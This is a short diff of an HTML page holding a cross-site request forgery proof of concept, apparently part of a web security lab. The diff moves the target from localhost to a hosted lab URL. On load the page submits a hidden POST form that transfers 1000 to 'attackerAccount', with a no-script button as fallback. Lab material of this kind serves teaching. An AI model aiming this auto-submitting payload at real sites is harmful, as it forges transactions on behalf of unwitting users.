@@ -12,7 +12,7 @@
         window.onload = function() {
             var form = document.createElement('form');
             form.method = 'POST';
-            form.action = 'http://localhost:5000/csrf/bank_transfer';
+            form.action = 'https://web-lab-2.onrender.com/csrf/bank_transfer';
 
             var amount = document.createElement('input');
             amount.type = 'hidden';
@@ -33,7 +33,7 @@
     </script>
 
     <noscript>
-        <form method="POST" action="http://localhost:5000/csrf/bank_transfer">
+        <form method="POST" action="https://web-lab-2.onrender.com//csrf/bank_transfer">
             <input type="hidden" name="amount" value="1000">
             <input type="hidden" name="recipient" value="attackerAccount">
             <button type="submit">Perform CSRF Attack</button>
